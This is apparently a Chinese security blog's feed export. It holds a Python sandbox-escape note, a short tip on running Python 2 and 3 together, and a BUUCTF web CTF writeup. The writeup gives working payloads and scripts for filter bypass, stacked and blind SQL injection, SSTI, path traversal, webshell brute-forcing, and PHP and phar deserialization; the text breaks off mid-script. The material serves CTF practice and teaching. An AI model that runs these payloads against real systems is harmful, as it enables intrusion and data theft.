'object'&gt;&gt;&gt;&gt; &#123;&#125;.__class__.__mro__[1]&lt;class 'object'&gt;&gt;&gt;&gt; [].__class__.__mro__[1]&lt;class 'object'&gt; 通过object类的subclasses()方法可以获得当前环境下能够访问的所有对象.123&apos;&apos;.__class__.__mro__[2].__subclasses__()[].__class__.__mro__[1].__subclasses__()&#123;&#125;.__class__.__bases__[0].__subclasses__() subclasses()第40个是file类型的object,可以用来读文件:12345&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]&lt;type 'file'&gt;&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]("1.txt").read()'\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n\n'&gt;&gt;&gt; 函数名过滤的绕过如果我们成功导入了包,但是system等方法被过滤了,而这些关键字和方法是不能用字符串编码加密解密的,那怎么办呢? __getattribute____getattribute__是属性访问拦截器,就是当这个类的属性被访问时,会自动调用类的getattribute方法.12345678&gt;&gt;&gt; class Test(object):... def echo(self):... print('pass it')... &gt;&gt;&gt; a = Test()&gt;&gt;&gt; a.__getattribute__('ec'+'ho')()pass it//假如echo这个字符串被过滤,我们无法直接调用echo方法,但是可以利用__getattribute__传字符串然后编码解码绕过过滤. 再看一个场景, 比如说一个沙盒waf了’ls’导致属性’globals’不能用，那么payload:12#python2().__class__.__mro__[-1].__subclasses__()[59].__init__.func_globals["linecache"].__dict__['o'+'s'].__dict__['system']('ls') 转换成1().__class__.__mro__[-1].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')["linecache"].__dict__['o'+'s'].__dict__['system']('l'+'s') func_globals:这个属性指向定义函数时的全局命名空间，返回它所有调用的基类和函数. linecache模块的作用是将文件内容读取到内存中，进行缓存. __init__:返回一个函数对象 __dict__:返回所有属性,包括属性,方法等 getattrgetattr() 函数用于返回一个对象属性值.12345678910111213&gt;&gt;&gt; class Test():... def __init__(self):... self.name='chenxiyuan'... def echo(self):... print('pass it')... &gt;&gt;&gt; a = Test()&gt;&gt;&gt; getattr(a,'name') #获取name属性'chenxiyuan'&gt;&gt;&gt; getattr(a,'echo') #获取echo方法&lt;bound method Test.echo of &lt;__main__.Test object at 0x7f3ff7d3ac18&gt;&gt;&gt;&gt;&gt; getattr(a,'echo')() #执行echo方法pass it 这样方法名被过滤的时候也可以通过对字符串操作进行绕过,再看几个payload：12getattr(__import__(&apos;os&apos;),&quot;metsys&quot;[::-1])(&apos;ls&apos;)getattr(__import__(&apos;os&apos;),&apos;flfgrz&apos;.encode(&apos;rot_13&apos;))(&apos;ls&apos;) 再看看Smi1e大神的一个payload:12345678910[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')#假如`.`被waf,可以用getattr()来代替[].__class__ ==&gt; getattr([],'__class__')[].__class__.__base__ ==&gt; getattr(getattr([],'__class__'),'__base__')[].__class__.__base__.__subclasses__()[59] ==&gt; getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59]#后面有括号[].__class__.__base__.__subclasses__()[59].__init__ ==&gt; getattr(getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59],'__init__')[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'] ==&gt; getattr(getattr(getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59],'__init__'),'__globals__')['linecache'][].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'] ==&gt; getattr(getattr(getattr(getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59],'__init__'),'__globals__')['linecache'],'__dict__')['os']#最终payloadgetattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59],'__init__'),'__globals__')['linecache'],'__dict__')['os'],'system')('ls') __globals__：返回一个当前空间下能使用的模块，方法和变量的字典 当函数名或属性名用这种方法写成字符串后,可绕过的操作就很多了.比如_被过滤了.我们可以用dir(0)[0][0]代替,可以看看dir(0)是什么:123&gt;&gt;&gt; dir(0)[&apos;__abs__&apos;, &apos;__add__&apos;, &apos;__and__&apos;, &apos;__class__&apos;, &apos;__cmp__&apos;, &apos;__coerce__&apos;, &apos;__delattr__&apos;, &apos;__div__&apos;, &apos;__divmod__&apos;, &apos;__doc__&apos;, &apos;__float__&apos;, &apos;__floordiv__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__getnewargs__&apos;, &apos;__hash__&apos;, &apos;__hex__&apos;, &apos;__index__&apos;, &apos;__init__&apos;, &apos;__int__&apos;, &apos;__invert__&apos;, &apos;__long__&apos;, &apos;__lshift__&apos;, &apos;__mod__&apos;, &apos;__mul__&apos;, &apos;__neg__&apos;, &apos;__new__&apos;, &apos;__nonzero__&apos;, &apos;__oct__&apos;, &apos;__or__&apos;, &apos;__pos__&apos;, &apos;__pow__&apos;, &apos;__radd__&apos;, &apos;__rand__&apos;, &apos;__rdiv__&apos;, &apos;__rdivmod__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__rfloordiv__&apos;, &apos;__rlshift__&apos;, &apos;__rmod__&apos;, &apos;__rmul__&apos;, &apos;__ror__&apos;, &apos;__rpow__&apos;, &apos;__rrshift__&apos;, &apos;__rshift__&apos;, &apos;__rsub__&apos;, &apos;__rtruediv__&apos;, &apos;__rxor__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__sub__&apos;, &apos;__subclasshook__&apos;, &apos;__truediv__&apos;, &apos;__trunc__&apos;, &apos;__xor__&apos;, &apos;bit_length&apos;, &apos;conjugate&apos;, &apos;denominator&apos;, &apos;imag&apos;, &apos;numerator&apos;, &apos;real&apos;]#dir(0)[0][0]返回的是列表的第0个元素的第0个字符,即&apos;__abs__&apos;的_ 那么上述payload就可以写为:1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+'class'+dir(0)[0][0]*2),dir(0)[0][0]*2+'base'+dir(0)[0][0]*2),dir(0)[0][0]*2+'subclasses'+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+'init'+dir(0)[0][0]*2),dir(0)[0][0]*2+'globals'+dir(0)[0][0]*2)['linecache'],dir(0)[0][0]*2+'dict'+dir(0)[0][0]*2)['os'],'system')('ls')]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python多版本共存]]></title>
    <url>%2F2019%2F07%2F23%2Fpython%E5%A4%9A%E7%89%88%E6%9C%AC%E5%85%B1%E5%AD%98%2F</url>
    <content type="text"><![CDATA[很多情况下,python2和python3我都要用到,那么多版本共存也是很简单的,记住命令就好了. windows:cmd12py -3 py -2 如果要使用指定版本的pip就加个m参数.12py -3 -m pip install multiprocessingpy -2 -m pip install multiprocessing macos:terminal12python3python2 如果要使用pip,也是加上m参数.]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF web writeup(一)]]></title>
    <url>%2F2019%2F07%2F21%2FBUUCTF-web-writeup%2F</url>
    <content type="text"><![CDATA[warmup靶机F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到flag in ffffllllaaaagggg,继续阅读源码。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"]; if (! isset($page) || !is_string($page)) &#123; echo "you can't see it"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo "you can't see it"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; &#125; ?&gt; mb_substr() 函数返回字符串的一部分， substr()函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr(). strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）.看到include $_REQUEST[‘file’]那就应该是文件包含读取ffffllllaaaagggg了,前两个条件file不为空且为字符串简单,主要是第三个条件,要通过chekFile函数返回True.分析checkFile函数,有三次检测file是否是白名单中的内容,如果是则返回true.还有对$page进行的操作,如果有?则截取?之前的字符返回,如果没有则返回本身.构造payload:file=hint.php%3F/../../../../ffffllllaaaagggg,首先第一次判断不通过，然后$page又返回自身,第二次判断不通过,进行url解码,hint.php?/../../../../ffffllllaaaagggg,然后$page返回?之前即hint.php通过第三次判断,返回true满足第三个条件.成功执行文件包含并目录穿越,读取到flag.随便注靶机这道题是2019强网杯的题,我有写过wp复现,传送门.大致再记录一下吧.waf:return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);过滤的其实不多,并且可以用堆叠注入查表和字段，多查询几次,整个数据库结构就清晰了。 &#39;;show tables; 123456789array(1) &#123; [0]=&gt; string(16) &quot;1919810931114514&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;words&quot;&#125; &#39;;show columns from words; 1234567891011121314151617181920212223242526272829array(6) &#123; [0]=&gt; string(2) &quot;id&quot; [1]=&gt; string(7) &quot;int(10)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125;array(6) &#123; [0]=&gt; string(4) &quot;data&quot; [1]=&gt; string(11) &quot;varchar(20)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; &#39;;show columns from1919810931114514; 1234567891011121314array(6) &#123; [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(12) &quot;varchar(100)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; 可以构造出原本的sql语句:1SELECT id,`data` FROM words WHERE id='1' ; 而select被过滤了,但查询语句查的是words表,而flag在另一个表中,如何查询呢?注意到waf黑名单其实过滤的很少的,比如alter和rename没被过滤就可以加以利用.我们可以把words表名改掉,再把flag所在表名改成words,再利用alter添加id字段,即可成功查询.payload:1&apos;;rename table words to wordss;rename table `1919810931114514` to `words`;alter table words add id int default 1# 另一种方法是利用自定义变量绕过.1-1&apos;;use supersqli;set @sqli=concat(&apos;se&apos;,&apos;lect `flag` from `1919810931114514`&apos;);PREPARE stmt1 FROM @sqli;EXECUTE stmt1; 高明的黑客靶机也是强网杯2019的题目,下载到源码,是3000个混淆的文件,要我们从里面找到后门,那就本地搭建个环境,写个脚本自动跑好了.1234567891011121314151617181920212223242526272829303132333435import osimport requestsimport reimport threadingdirs = os.listdir(r'D:\phpStudy\WWW\test\src')url='http://www.test.com/src/'def findit(f): path='D:\\phpStudy\\WWW\\test\\src\\'+f r = open(path, 'r', encoding='UTF-8').read() print('正在检测' + f) t = re.findall("\$_POST\['(.*?)'\]",r,re.S) for i in t: data=&#123;i:'echo "find it";'&#125; if 'find it' in requests.post(url+f,data=data).text: print('get shell:'+f+'post:'+i) exit(0) t = re.findall("\$_GET\['(.*?)'\]", r, re.S) for i in t: if 'find it' in requests.get(url+f+'?'+i+'='+'echo "find it";').text: print('get shell:'+f+'get:'+i) exit(0)if __name__ == '__main__': for i in range(0,149): onelist=dirs[i*20:(i+1)*20-1] threads=[] for j in onelist: t = threading.Thread(target=findit,args=(j,)) threads.append(t) for j in range(0, len(threads) - 1): threads[j].start() for j in range(0, len(threads) - 1): threads[j].join() 多进程再试试?123456789101112131415161718192021222324252627282930313233343536import osimport requestsimport reimport threadingimport multiprocessingdirs = os.listdir(r'D:\phpStudy\WWW\test\src')url='http://www.test.com/src/'def findit(f): path='D:\\phpStudy\\WWW\\test\\src\\'+f r = open(path, 'r', encoding='UTF-8').read() print('正在检测' + f) t = re.findall("\$_POST\['(.*?)'\]",r,re.S) for i in t: data=&#123;i:'echo "find it";'&#125; if 'find it' in requests.post(url+f,data=data).text: print('get shell:'+f+'post:'+i) return i t = re.findall("\$_GET\['(.*?)'\]", r, re.S) for i in t: if 'find it' in requests.get(url+f+'?'+i+'='+'echo "find it";').text: print('get shell:'+f+'get:'+i) return i return Falsedef testall(allfile): for i in allfile: result = findit(i) if result: exit(0)if __name__ == '__main__': pool = multiprocessing.Pool(processes=30) for i in range(0, len(dirs), 100): pool.apply_async(testall,args=(set(dirs[i:i+100]),)) pool.close() pool.join() 终于跑出来了，连上后门直接读1http://web15.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag easy_tornado靶机得到提示filehash:md5(cookie_secret + md5(filename))并且flag在/fllllllllllllag,现在就是要得到cookie_secret.访问错误的时候得到http://web9.buuoj.cn/error?msg=Error,这里运用了模板渲染http://web9.buuoj.cn/error?msg=1,测试一下果然.所以应该是服务端模板注入(ssti),一顿fuzz,还过滤了好多字符.看看黑翼天使23,得到思路.访问http://web9.buuoj.cn/error?msg=,返回:1&#123;&apos;autoreload&apos;: True, &apos;compiled_template_cache&apos;: False, &apos;cookie_secret&apos;: &apos;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&apos;&#125; 根据hintMD5加密一下即可构造payload:1http://web9.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=70aed71508e50d160a73756a21e9953d [CISCN2019 华北赛区 Day2 Web1]Hack World靶机fuzz一下,过滤了挺多字符,空格就被过滤了,可以用括号绕过、换行绕过、或者制表符绕过.然后利用布尔盲注,可以利用返回1的时候输出Hello, glzjin wants a girlfriend.,当然也可以利用时间盲注不过会慢一点.写个脚本跑.12345678910111213141516171819202122import requestsurl = "http://web43.buuoj.cn/index.php"headers=&#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'&#125;flag = ""while(True): for i in 'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;': data=&#123; 'id' :"if(substr((select(flag)from(flag)),1,&#123;&#125;)='&#123;&#125;&#123;&#125;',1,2)".format(len(flag) + 1,flag,i) &#125; """ data = &#123; 'id': "ELT(left((select(flag)from(flag)),&#123;&#125;)='&#123;&#125;&#123;&#125;',1)".format(len(flag) + 1, flag, i) &#125;""" if "glzjin" in requests.post(url,data=data,headers=headers).text: flag += i print(flag) break 学到了一个elt函数:1234567891011121314151617181920212223mysql&gt; select elt(0,'a','b');+----------------+| elt(0,'a','b') |+----------------+| NULL |+----------------+1 row in set (0.00 sec)mysql&gt; select elt(3,'a','b');+----------------+| elt(3,'a','b') |+----------------+| NULL |+----------------+1 row in set (0.00 sec)mysql&gt; select elt(1,'a','b');+----------------+| elt(1,'a','b') |+----------------+| a |+----------------+1 row in set (0.00 sec) piapiapia靶机进去是登陆界面,小猫咪在piapiapia敲键盘,蛮可爱,一般这个时候没思路了就去扫描一下,应该会有源码泄露.www.zip成功下载源码. config.php1234567&lt;?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = '';?&gt; 那么flag就应该在config.php里了.逻辑上应该register,再login,到profile检测为null,跳转到update页面,完成后再转到profile页面.再看看profile.php源码: profile.php12345678910111213141516171819202122232425262728293031323334353637&lt;?php require_once('class.php'); if($_SESSION['username'] == null) &#123; die('Login First'); &#125; $username = $_SESSION['username']; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header('Location: update.php'); &#125; else &#123; $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo']));?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Profile&lt;/title&gt; &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt; &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container" style="margin-top:100px"&gt; &lt;img src="data:image/gif;base64,&lt;?php echo $photo; ?&gt;" class="img-memeda " style="width:180px;margin:0px auto;"&gt; &lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt; &lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt; &lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; 可以想到是通过file_get_contents获取config.php的内容,那么我们势必要在某个地方构造序列化来执行我们想要的,再来看看update.php: update.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php require_once('class.php'); if($_SESSION['username'] == null) &#123; die('Login First'); &#125; if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) &#123; $username = $_SESSION['username']; if(!preg_match('/^\d&#123;11&#125;$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;UPDATE&lt;/title&gt; &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt; &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container" style="margin-top:100px"&gt; &lt;form action="update.php" method="post" enctype="multipart/form-data" class="well" style="width:220px;margin:0px auto;"&gt; &lt;img src="static/piapiapia.gif" class="img-memeda " style="width:180px;margin:0px auto;"&gt; &lt;h3&gt;Please Update Your Profile&lt;/h3&gt; &lt;label&gt;Phone:&lt;/label&gt; &lt;input type="text" name="phone" style="height:30px"class="span3"/&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input type="text" name="email" style="height:30px"class="span3"/&gt; &lt;label&gt;Nickname:&lt;/label&gt; &lt;input type="text" name="nickname" style="height:30px" class="span3"&gt; &lt;label for="file"&gt;Photo:&lt;/label&gt; &lt;input type="file" name="photo" style="height:30px"class="span3"/&gt; &lt;button type="submit" class="btn btn-primary"&gt;UPDATE&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; 在这里首先是对传进来的4个内容进行判断,但是我们发现nickname如果是数组就可以绕过:123456789&lt;?php$_POST['nickname']=array(1);if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)&#123; die('Invalid nickname');&#125;else&#123; echo 'pass it';&#125;//pass it ?&gt; 这样我们就可以控制序列化内容了,但是序列化后的内容总是被&quot;&quot;包围起来,还是不能逃逸来构造我们想要的.接下来是update_profile方法对序列化后的$profile进行操作,那么我们看看class.php里面user类的update_profile方法有没有可利用的地方. class.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&lt;?phprequire('config.php');class user extends mysql&#123; private $table = 'users'; public function is_exists($username) &#123; $username = parent::filter($username); $where = "username = '$username'"; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array('username', 'password'); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = "username = '$username'"; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = "username = '$username'"; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = "username = '$username'"; return parent::update($this-&gt;table, 'profile', $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config['hostname'], $config['username'], $config['password'] ); mysql_select_db($config['database']); mysql_query("SET sql_mode='strict_all_tables'"); return $this-&gt;link; &#125; public function select($table, $where, $ret = '*') &#123; $sql = "SELECT $ret FROM $table WHERE $where"; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(',', $key_list); $value = '\'' . implode('\',\'', $value_list) . '\''; $sql = "INSERT INTO $table ($key) VALUES ($value)"; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = "UPDATE $table SET $key = '$value' WHERE $where"; return mysql_query($sql); &#125; public function filter($string) &#123; $escape = array('\'', '\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new user();$user-&gt;connect($config); $new_profile = parent::filter($new_profile);这条语句是对传进来的序列化后的$profile进行过滤,再看看父类的filter方法.可以看到是为了防止sql注入,对输入中的单引号、反斜杠以及一些敏感词进行替换,但是这个对序列化后字符串的替换操作,恰好提供了逃逸的的条件.切入点就是这个where被替换为hacker.举个例子:1234567&lt;?phpecho unserialize('s:6:"where""');//where"echo unserialize('s:6:"hacker""');//hacker?&gt; 也就是说,原来where&quot;是6个字符,替换为hacker&quot;以后,6个字符刚好读到hacker并且右边是&quot;成功闭合,那如果我们原来的字符串&quot;号后面还有字符,不就成功执行我们想要的操作了吗,只要控制替换操作后多的字符数等于&quot;加上之后字符的数量就可以了,从where替换到hacker,增加了1,那我们想要逃逸多少个字符,就用多少个where.再看个例子:1234567891011121314151617&lt;?php//假如我们想得到服务器上的樱井莉亚的图片(雾)$profile['nickname']= 'cxycxycxy";s:5:"photo";s:16:"yingjingliya.jpg";&#125;';$profile['photo']= 'cxy.jpg';var_dump(serialize($profile));//a:2:&#123;s:8:"nickname";s:48:"cxycxycxy";s:5:"photo";s:16:"yingjingliya.jpg";&#125;";s:5:"photo";s:7:"cxy.jpg";&#125;/*服务器操作有点憨批,非要把检测到的`cxy`3个字符替换成16个字符的`abcdefghijklmnop`,我只要用3个cxy就能逃逸`";s:5:"photo";s:16:"yingjingliya.jpg";&#125;`这39个字符*/$profile = 'a:2:&#123;s:8:"nickname";s:48:"abcdefghijklmnopabcdefghijklmnopabcdefghijklmnop";s:5:"photo";s:16:"yingjingliya.jpg";&#125;";s:5:"photo";s:7:"cxy.jpg";&#125;';var_dump(unserialize($profile));/*array(2) &#123; ["nickname"]=&gt; string(48) "abcdefghijklmnopabcdefghijklmnopabcdefghijklmnop" ["photo"]=&gt; string(16) "yingjingliya.jpg"&#125;*///?&gt; 知道方法以后就好办了,现在本地测试一下,了解序列化后的结构:12345678&lt;?php$profile[&apos;phone&apos;] = &apos;11111111111&apos;; $profile[&apos;email&apos;] = &apos;969987508@qq.com&apos;; $profile[&apos;nickname&apos;] = array(&apos;cxy&apos;); $profile[&apos;photo&apos;] = &apos;cxy.jpg&apos;;echo serialize($profile);//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;969987508@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;cxy&quot;;&#125;s:5:&quot;photo&quot;;s:7:&quot;cxy.jpg&quot;;&#125;?&gt; 那么可以知道我们需要逃逸的字符串:&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php,需要31个where,构造payload:1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php 检查img标签,成功获取config.php内容的base64编码,解码后即可得到flag. admin靶机这道题问题还挺多的,参考出题师傅的博客ckj123.上面三种方法就不谈了,恰好前几天看了python安全.传送门.登陆出错后弹出debug页面,是flask框架，版本是2.7,发现居然能写pythonshell,果断尝试,什么保护措施都没有,直接上os,platform,subprocess123456789&gt;&gt;&gt;import os&gt;&gt;&gt; os.popen('grep -R "flag"').read()'app/templates/index.html:&lt;h1 class="nav"&gt;flag&#123;btf87924u5bvgfxgu0bsztm1zkkwxfgu&#125;&lt;/h1&gt;\napp/static/css/semantic.css: @import url(https://fonts.googleapis.com/css?&gt;&gt;&gt;import subprocess&gt;&gt;&gt;subprocess.Popen('grep -R "flag"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()'app/templates/index.html:&lt;h1 class="nav"&gt;flag&#123;btf87924u5bvgfxgu0bsztm1zkkwxfgu&#125;&lt;/h1&gt;\napp/static/css/semantic.css: @import url(https://fonts.googleapis.com/css?&gt;&gt;&gt;import platform&gt;&gt;&gt;platform.popen('grep -R "flag"').read()'app/templates/index.html:&lt;h1 class="nav"&gt;flag&#123;btf87924u5bvgfxgu0bsztm1zkkwxfgu&#125;&lt;/h1&gt;\napp/static/css/semantic.css: @import url(https://fonts.googleapis.com/css? Dropbox靶机访问后是个文件管理系统,先随便上传个文件,下载时候bp抓包修改文件名即可得到源码filename=../../index.php还有class.php,delete.php,upload.php.可以利用phar反序列化漏洞.传送门先看个demo吧: phar.php123456789101112131415&lt;?php class TestObject &#123; &#125; @unlink("phar.phar"); $phar = new Phar("phar.phar"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub $o = new TestObject(); $o -&gt; data = 'chenxiyuan'; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 执行php phar.php,生成phar.phar(要将php.ini中的phar.readonly选项设置为Off).打开文件可以看到meta-data是以序列化的形式存储.php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化. phartest.php1234567891011121314&lt;?php class TestObject &#123; public function __destruct() &#123; echo $this-&gt;data; &#125; &#125; $filename = 'phar://phar.phar/test.txt'; //unlink($filename); //$filename= 'phar://phar.phar'; file_get_contents($filename); ?&gt; 运行php phartest.php,成功输出chenxiyuan.测试发现,$filename= &#39;phar://phar.phar&#39;,虽然会报错但依旧会输出.经过代码审计发现delete.php可以利用.$file-&gt;detele();再看class.php里的file类的delete方法:123public function detele() &#123; unlink($this-&gt;filename); &#125; unlink可以反序列化,而且delete.php文件incldue了class.php,也就可以利用FileList类的__destruct()方法,满足攻击的三个条件:1.phar文件要能够上传到服务器端。2.要有可用的魔术方法作为“跳板”。3.文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。然后分析class.php类的结构关系,构造脚本生成phar文件:123456789101112131415161718192021222324252627&lt;?php class User &#123; public $db; &#125; class File&#123; public $filename; public function __construct($name)&#123; $this-&gt;filename=$name; &#125; &#125; class FileList &#123; private $files; public function __construct()&#123; $this-&gt;files=array(new File(&apos;/flag.txt&apos;)); &#125; &#125; $o = new User(); $o-&gt;db =new FileList(); @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 上传生成的phar.phar,然后抓包改Content-Type为image/jpeg.然后再delete,抓包改filename为phar://phar.jpg.成功读取flag. ikun靶机先注册个账号,登陆.F12,提示这题脑洞很大留了hint,看到ikun们冲鸭,一定要买到lv6!!!,应该是要买lv6的账号,写个脚本找:123456789import requestsurl="http://web44.buuoj.cn/shop?page="for i in range(500): r =requests.get(url+str(i)) if 'lv6.png' in r.text: 